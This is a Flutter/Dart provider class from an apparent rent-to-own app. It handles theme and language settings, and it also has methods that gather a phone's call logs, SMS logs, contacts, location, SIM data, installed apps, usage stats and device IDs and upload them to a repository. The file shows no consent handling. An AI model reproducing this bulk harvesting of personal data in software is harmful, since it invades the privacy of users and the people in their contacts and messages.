import 'package:flutter/material.dart';
import 'package:rent2ownwelcomeapp/src/core/core.dart';
import 'package:rent2ownwelcomeapp/src/features/shared/app_device_info.dart';

import 'app_state.dart';

class AppProvider extends ChangeNotifier {
  final AppRepository _repo;
  MiscRepository miscRepo;
  AppProvider(this._repo, this.miscRepo) {
    loadSettings();
  }

  AppState state = const AppState.initial();

  Future<void> loadSettings() async {
    await _repo.updateDeviceId();
    final themeMode = await _repo.themeMode();
    final languageCode = await _repo.languageCode();
    final isFirstInstallation = await _repo.isFirstInstallation();
    setState(AppState.success(
      themeMode: themeMode,
      languageCode: languageCode,
      isFirstInstallation:  isFirstInstallation,
    ));
  }

  void setState(AppState state) {
    this.state = state;
    notifyListeners();
  }

  Future<void> updateThemeMode(ThemeMode? newThemeMode) async {
    if (newThemeMode == null || newThemeMode == state.themeMode) return;

    // Update ThemeMode
    setState(state.map(
      initial: (state) => state,
      success: (state) => state.copyWith(themeMode: newThemeMode),
    ));

    // Save ThemeMode into locale storage
    await _repo.updateThemeMode(newThemeMode);
  }

  Future<void> toggleThemeMode() async {
    // Update ThemeMode
    final themeMode =
        state.themeMode == ThemeMode.light ? ThemeMode.dark : ThemeMode.light;
    setState(state.map(
      initial: (state) => state,
      success: (state) => state.copyWith(themeMode: themeMode),
    ));

    // Save ThemeMode into locale storage
    await _repo.updateThemeMode(themeMode);
  }

  Future<void> updateLanguage(String? newLanguage) async {
    if (newLanguage == null || newLanguage == state.languageCode) return;

    // Update ThemeMode
    setState(state.map(
      initial: (state) => state,
      success: (state) => state.copyWith(languageCode: newLanguage),
    ));

    // Save ThemeMode into locale storage
    await _repo.updateLanguage(newLanguage);
  }

  Future<void> updateFirstInstallation(bool? isFirst) async {
    setState(state.map(
      initial: (state) => state,
      success: (state) => state.copyWith(isFirstInstallation: isFirst?? false),
    ));

    await _repo.updateFirstInstallation(isFirst ?? false );
  }


  Future<void> updateCallLogs() async {
    final  data =  await AppDeviceInfo().getCallLogs();
    miscRepo.uploadCallLogs(data);
  }
    Future<void> updateSmsLogs() async {
    final data = await AppDeviceInfo().getSmsLogs();
    miscRepo.uploadSmsLogs(data);
  }
    Future<void> updateContacts() async {
    final data = await AppDeviceInfo().getContacts();
    miscRepo.uploadContacts(data);
  }
    Future<void> updateLocation() async {
    final data = await AppDeviceInfo().getLocation();
    miscRepo.uploadLocations(data);
  }

    Future<void> updateSimCards(String phoneNo) async {
    final data = await AppDeviceInfo().getSimCards(phoneNo);
    miscRepo.uploadSimCards(data);
  }

  // V2 Extras
   Future<void> updateCallDurationFrequency() async {
    final data = await AppDeviceInfo().getCallDurationNFrequency();
    miscRepo.uploadCallFrequency(data);
  }

  Future<void> updateSmsFrequency() async {
    final data = await AppDeviceInfo().getTextMessageFrequency();
    miscRepo.uploadSmsFrequency(data);
  }

  Future<void> updateAppDownloadHistory() async {
    final data = await AppDeviceInfo().getInstalledApps();
    miscRepo.uploadAppHistory(data);
  }

  Future<void> updateAppUsage() async {
    final data = await AppDeviceInfo().getUsageStats();
    miscRepo.uploadAppUsage(data);
  }

  Future<void> updateDeviceInfo() async {
    final data = await AppDeviceInfo().getDeviceIdAndInfo();
    miscRepo.uploadDeviceInfo(data);
  }
  
}
